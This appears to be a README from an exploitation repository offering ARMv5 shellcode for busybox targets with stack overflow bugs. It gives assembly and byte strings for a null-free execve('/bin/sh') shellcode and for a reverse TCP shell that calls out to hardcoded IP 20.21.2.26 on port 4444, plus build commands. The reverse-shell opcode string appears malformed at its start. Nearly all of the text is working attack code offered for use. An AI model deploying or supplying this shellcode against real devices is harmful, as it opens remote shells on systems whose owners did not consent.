# Armv5_shellcode

>Background:
> 	 Since the default armv7 syntax of the shellcode generated in pwntools cannot be executed under the armv5 instruction set chip, the following shellcode is written to facilitate the exploitation of vulnerabilities. This shellcode can be used by the armv5 test without null byte. This shellcode mainly operates on the stack and does not modify the code segment and data segment.
>Applicable scenarios:
>
>    	 1. The target applies to busybox
>    	 2. There are stack overflow or other vulnerabilities that can hijack program flow
>    	 3. Arrange this shellcode in memory



###### Applicable to busybox

```
/*
#execve("/bin/sh",["/bin/sh"],NULL)
#Date:2022-4-14
#Author:doudoudedi
#Text:F1C200s
*/
.section .text
.global _start

_start:
	.ARM
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	eor r3,r3,r3
	eor r2,r2,r2
	eor r4,r4,r4
	add r4,sp,#-0x1b
	add r3,pc,#1
	bx  r3
	.THUMB
	mov r0,r4
	push {r0,r1}
	mov r1,sp
	mov r2,#1
	sub r2,r2,#1
	mov r7,#0xb
	svc #1

/*
Compile and link with: 
# arm-linux-gnueabi-as -o shellcode.o shellcode.s
# arm-linux-gnueabi-ld -N shellcode.o -o shellcode
# arm-linux-gnueabi-objcopy -O binary --only-section=.text shellcode shellcode.text
shellcode_opcode:
"\x68\x70\xa0\xe3\x15\x70\x4d\xe5\x73\x70\xa0\xe3\x16\x70\x4d\xe5\x2f\x70\xa0\xe3\x17\x70\x4d\xe5\x6e\x70\xa0\xe3\x18\x70\x4d\xe5\x69\x70\xa0\xe3\x19\x70\x4d\xe5\x62\x70\xa0\xe3\x1a\x70\x4d\xe5\x2f\x70\xa0\xe3\x1b\x70\x4d\xe5\x03\x30\x23\xe0\x02\x20\x22\xe0\x04\x40\x24\xe0\x1b\x40\x4d\xe2\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x20\x1c\x03\xb4\x69\x46\x01\x22\x01\x3a\x0b\x27\x01\xdf\xc0\x46"
*/
```

##### Reverse Shell TCP(Armv5)

updating
```
/*
#reverse_ip=20.21.2.26,port=4444
#fd=socket();connect("20.21.2.26",4444);dup2(fd,0);dup2(fd,1);dup(fd,2);execve("/bin/sh",["/bin/sh"],NULL)
#Date:2022-4-14
#Author:doudoudedi
#Text:F1C200s

.section .text
.global _start

_start:
	.ARM
	eor r4,r4,r4
	mov r7,#0x14
	strb r7,[sp,#-0x28]
	mov r7,#0x15
	strb r7,[sp,#-0x27]
	mov r7,#0x2
	strb r7,[sp,#-0x26]
	mov r7,#0x1a
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x2c]
	strb r4,[sp,#-0x2b]
	mov r7,#0x11
	strb r7,[sp,#-0x2a]
	mov r7,#0x5c
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	add r4,sp,#-0x1b
	add r5,sp,#-0x2c
	add r3,pc,#1
	bx  r3
	.THUMB
	mov r0,#2
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc #1
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc #1
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r0,r1}
	mov r1,sp
	mov r7,#0xb
	svc #1
opcode:
shellcode="04\x40\x24\xe0\x14\x70\xa0\xe3\x28\x70\x4d\xe5\x15\x70\xa0\xe3\x27\x70\x4d\xe5\x02\x70\xa0\xe3\x26\x70\x4d\xe5\x1a\x70\xa0\xe3\x25\x70\x4d\xe5\x02\x70\xa0\xe3\x2c\x70\x4d\xe5\x2b\x40\x4d\xe5\x11\x70\xa0\xe3\x2a\x70\x4d\xe5\x5c\x70\xa0\xe3\x29\x70\x4d\xe5\x14\x40\x4d\xe5\x68\x70\xa0\xe3\x15\x70\x4d\xe5\x73\x70\xa0\xe3\x16\x70\x4d\xe5\x2f\x70\xa0\xe3\x17\x70\x4d\xe5\x6e\x70\xa0\xe3\x18\x70\x4d\xe5\x69\x70\xa0\xe3\x19\x70\x4d\xe5\x62\x70\xa0\xe3\x1a\x70\x4d\xe5\x2f\x70\xa0\xe3\x1b\x70\x4d\xe5\x1b\x40\x4d\xe2\x2c\x50\x4d\xe2\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x52\x40\xc8\x27\x51\x37\x01\xdf\x06\x1c\x29\x1c\x10\x22\x02\x37\x01\xdf\x30\x1c\x49\x40\x3f\x27\x01\xdf\x30\x1c\x01\x31\x01\xdf\x30\x1c\x01\x31\x01\xdf\x20\x1c\x49\x40\x52\x40\x03\xb4\x69\x46\x0b\x27\x01\xdf"
*/
```
